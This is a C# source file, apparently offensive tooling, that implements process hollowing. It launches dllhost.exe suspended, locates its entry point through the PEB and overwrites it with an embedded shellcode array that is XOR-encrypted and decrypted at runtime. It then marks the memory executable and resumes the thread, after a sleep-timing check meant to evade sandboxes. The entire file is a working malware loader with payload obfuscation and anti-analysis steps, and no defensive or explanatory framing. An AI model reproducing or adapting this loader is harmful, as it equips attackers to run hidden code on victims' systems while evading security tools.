using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Hollow
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
            int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        const uint PAGE_EXECUTE_READ = 0x20;

        static void XOR(byte[] data, int dataLen, byte[] key, int keyLen)
        {
            int j = 0;
            for (int i = 0; i < dataLen; i++)
            {
                data[i] = (byte)(data[i] ^ key[j]);
                j++;
                if (j == keyLen)
                    j = 0;
            }
        }

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] key = Encoding.ASCII.GetBytes("mysecretkeee");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Step 1: Create Suspended dllhost.exe
            bool result = CreateProcess(null, "C:\\Windows\\System32\\dllhost.exe",
                IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            if (!result)
            {
                Console.WriteLine("Failed to create process.");
                return;
            }

            // Step 2: Get PEB using ZwQueryInformationProcess
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Step 3: Read Image Base Address
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr dllhostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Step 4: Read PE Header
            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, dllhostBase, data, data.Length, out nRead);

            // Step 5: Parse EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)((UInt64)dllhostBase + entrypoint_rva);

            // Step 6: Write encrypted shellcode at EntryPoint
            byte[] buf = new byte[851] {
    0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa9, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34,
    0x35, 0x3a, 0x54, 0xa6, 0x0e, 0x2d, 0xee, 0x37, 0x0d, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26,
    0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x34, 0x42, 0xac, 0x2b, 0x7d, 0xd2, 0x3e, 0x21, 0x2d, 0x54, 0xa5,
    0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88,
    0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0x14, 0xe4, 0x0c,
    0x73, 0x6e, 0x67, 0x6a, 0xe8, 0x0b, 0x73, 0x65, 0x63, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d,
    0xe8, 0xb9, 0x07, 0x02, 0x2b, 0x73, 0xb5, 0xff, 0x23, 0x7d, 0x21, 0xee, 0x2d, 0x59, 0x23, 0x2c,
    0x62, 0xa2, 0x86, 0x22, 0x26, 0x54, 0xac, 0x2d, 0x92, 0xb0, 0x32, 0xee, 0x57, 0xfa, 0x2d, 0x75,
    0xbd, 0x2d, 0x54, 0xa5, 0x2c, 0xb8, 0xba, 0x68, 0xcf, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94,
    0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c,
    0x62, 0xa2, 0x03, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff,
    0x6f, 0xed, 0x24, 0x3d, 0x2c, 0x21, 0x3b, 0x64, 0xb3, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c,
    0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee,
    0x71, 0x9b, 0x2e, 0x8b, 0x94, 0x9a, 0x38, 0x2d, 0x5c, 0xa2, 0x20, 0x2c, 0xdd, 0x05, 0x0c, 0x1a,
    0x02, 0x0b, 0x00, 0x11, 0x6d, 0x38, 0x25, 0x2d, 0xea, 0x93, 0x2c, 0xb3, 0xa9, 0x29, 0x12, 0x43,
    0x6a, 0x86, 0xa6, 0x36, 0x30, 0x9a, 0xe6, 0x74, 0x6b, 0x65, 0x28, 0x0a, 0x17, 0x10, 0x1f, 0x09,
    0x02, 0x5d, 0x50, 0x5a, 0x5b, 0x45, 0x4d, 0x0c, 0x3d, 0x18, 0x17, 0x5e, 0x43, 0x31, 0x35, 0x21,
    0x4b, 0x2a, 0x36, 0x45, 0x5c, 0x4e, 0x2c, 0x52, 0x3c, 0x40, 0x45, 0x18, 0x02, 0x0e, 0x00, 0x45,
    0x20, 0x18, 0x10, 0x45, 0x2c, 0x21, 0x45, 0x2c, 0x42, 0x45, 0x24, 0x15, 0x1d, 0x15, 0x16, 0x32,
    0x06, 0x10, 0x2e, 0x1d, 0x1f, 0x4a, 0x53, 0x55, 0x58, 0x57, 0x42, 0x4b, 0x52, 0x47, 0x45, 0x5c,
    0x20, 0x2d, 0x31, 0x28, 0x21, 0x55, 0x53, 0x09, 0x0a, 0x19, 0x00, 0x54, 0x2c, 0x00, 0x06, 0x0e,
    0x02, 0x50, 0x53, 0x33, 0x06, 0x00, 0x16, 0x1d, 0x04, 0x0b, 0x4a, 0x54, 0x5a, 0x57, 0x47, 0x4b,
    0x52, 0x52, 0x28, 0x1b, 0x09, 0x0c, 0x09, 0x00, 0x42, 0x48, 0x46, 0x20, 0x52, 0x46, 0x5d, 0x54,
    0x38, 0x04, 0x03, 0x04, 0x1f, 0x10, 0x5c, 0x53, 0x53, 0x46, 0x4b, 0x45, 0x6b, 0x3c, 0x36, 0x3f,
    0x20, 0x48, 0xb3, 0x28, 0x52, 0xbb, 0x36, 0x27, 0x22, 0xdf, 0x5f, 0x33, 0x14, 0xde, 0x73, 0x65,
    0x63, 0x72, 0x9a, 0xa1, 0x83, 0x69, 0x65, 0x65, 0x6d, 0x48, 0x44, 0x57, 0x4d, 0x40, 0x55, 0x5a,
    0x5a, 0x55, 0x4b, 0x56, 0x6d, 0x23, 0x3b, 0xec, 0xa2, 0x3b, 0xa2, 0xb4, 0xd0, 0x64, 0x65, 0x65,
    0x20, 0x48, 0xba, 0x36, 0x30, 0x18, 0x66, 0x27, 0x22, 0xdf, 0x32, 0xec, 0xf2, 0xbf, 0x73, 0x65,
    0x63, 0x72, 0x9a, 0xa1, 0x83, 0xc3, 0x65, 0x65, 0x6d, 0x56, 0x46, 0x54, 0x0a, 0x19, 0x00, 0x59,
    0x0a, 0x51, 0x24, 0x06, 0x54, 0x2a, 0x46, 0x23, 0x33, 0x1f, 0x2a, 0x19, 0x38, 0x1c, 0x5c, 0x12,
    0x0f, 0x1c, 0x38, 0x09, 0x32, 0x35, 0x1d, 0x1a, 0x2c, 0x1c, 0x03, 0x10, 0x28, 0x4d, 0x31, 0x0b,
    0x35, 0x2b, 0x56, 0x38, 0x26, 0x3a, 0x33, 0x0a, 0x20, 0x15, 0x31, 0x0f, 0x34, 0x4a, 0x23, 0x4c,
    0x06, 0x26, 0x51, 0x24, 0x2b, 0x08, 0x3e, 0x15, 0x0b, 0x17, 0x36, 0x33, 0x0d, 0x50, 0x1c, 0x17,
    0x32, 0x49, 0x4b, 0x03, 0x33, 0x19, 0x54, 0x27, 0x1d, 0x04, 0x03, 0x22, 0x5c, 0x31, 0x41, 0x09,
    0x12, 0x0b, 0x01, 0x39, 0x58, 0x0b, 0x3d, 0x30, 0x25, 0x2e, 0x43, 0x54, 0x26, 0x35, 0x22, 0x05,
    0x00, 0x2f, 0x29, 0x0b, 0x0f, 0x40, 0x25, 0x00, 0x51, 0x20, 0x22, 0x04, 0x2f, 0x29, 0x2a, 0x2e,
    0x0a, 0x49, 0x3b, 0x26, 0x05, 0x16, 0x24, 0x06, 0x2d, 0x48, 0x09, 0x3d, 0x1b, 0x12, 0x12, 0x2e,
    0x17, 0x0a, 0x2d, 0x31, 0x23, 0x12, 0x26, 0x09, 0x29, 0x09, 0x03, 0x0c, 0x2f, 0x5f, 0x02, 0x3f,
    0x3a, 0x15, 0x5d, 0x08, 0x34, 0x26, 0x17, 0x2d, 0x0c, 0x13, 0x3d, 0x45, 0x3f, 0x48, 0x65, 0x2d,
    0xe4, 0xb8, 0x20, 0x3f, 0x22, 0x2a, 0x28, 0x45, 0xa2, 0x36, 0x2d, 0xdd, 0x6d, 0x4b, 0xdb, 0xe1,
    0x63, 0x72, 0x65, 0x74, 0x3b, 0x36, 0x36, 0x2c, 0xaa, 0xbb, 0x98, 0x30, 0x4d, 0x49, 0x9a, 0xa1,
    0x23, 0xec, 0xa3, 0x0f, 0x67, 0x26, 0x3b, 0xec, 0x92, 0x18, 0x7a, 0x2e, 0x39, 0x0d, 0xe5, 0x56,
    0x6d, 0x79, 0x3a, 0xec, 0x83, 0x18, 0x61, 0x35, 0x32, 0x2c, 0xdf, 0x10, 0x2b, 0xe7, 0xf5, 0x65,
    0x63, 0x72, 0x65, 0x8b, 0xbe, 0x28, 0x54, 0xa5, 0x3e, 0x23, 0x3b, 0xec, 0x92, 0x3f, 0x54, 0xbd,
    0x26, 0x54, 0xac, 0x36, 0x3e, 0x30, 0xb4, 0xa7, 0x4e, 0x74, 0x7d, 0x0f, 0x94, 0xb0, 0xe0, 0xa5,
    0x18, 0x66, 0x3b, 0xa2, 0xa2, 0xfa, 0x76, 0x74, 0x6b, 0x2c, 0xdf, 0x21, 0x9d, 0x4c, 0x93, 0x65,
    0x63, 0x72, 0x65, 0x8b, 0xbe, 0x2d, 0x9a, 0xaa, 0x19, 0x7b, 0x98, 0xcf, 0x8b, 0x27, 0x65, 0x74,
    0x6b, 0x36, 0x3c, 0x0f, 0x2d, 0x23, 0x3a, 0xec, 0xb2, 0xb3, 0x87, 0x64, 0x22, 0xa2, 0xa5, 0x65,
    0x7d, 0x79, 0x73, 0x2c, 0xd9, 0x2a, 0xc1, 0x27, 0x8e, 0x65, 0x65, 0x65, 0x6d, 0x86, 0xa6, 0x2d,
    0xf0, 0x21, 0x36, 0x3c, 0xe2, 0x82, 0x2d, 0xec, 0x9c, 0x31, 0xfa, 0xbf, 0x2a, 0xb5, 0xa5, 0x74,
    0x4b, 0x65, 0x65, 0x2c, 0xe4, 0x80, 0x3a, 0xdf, 0x71, 0xe4, 0xec, 0x96, 0x6b, 0x65, 0x65, 0x65,
    0x92, 0xac, 0x3b, 0xe6, 0xa7, 0x52, 0xe0, 0xb4, 0x1f, 0xd7, 0x03, 0xee, 0x6a, 0x31, 0x72, 0xa6,
    0xe6, 0xb2, 0x10, 0xa6, 0x33, 0xa6, 0x3d, 0x0f, 0x6d, 0x20, 0x3a, 0xa2, 0xa1, 0x82, 0xd0, 0xd6,
    0x3d, 0x9a, 0xb0
};


            // Step 6: Decrypt shellcode
            XOR(buf, buf.Length, key, key.Length);

            // Step 7: Write shellcode to entry point
            WriteProcessMemory(pi.hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            // Step 8: Change memory protection to RX
            uint oldProtect;
            VirtualProtectEx(pi.hProcess, addressOfEntryPoint, (IntPtr)buf.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Step 9: Resume Thread
            ResumeThread(pi.hThread);

            Console.WriteLine("Process hollowing completed !");
        }
    }
}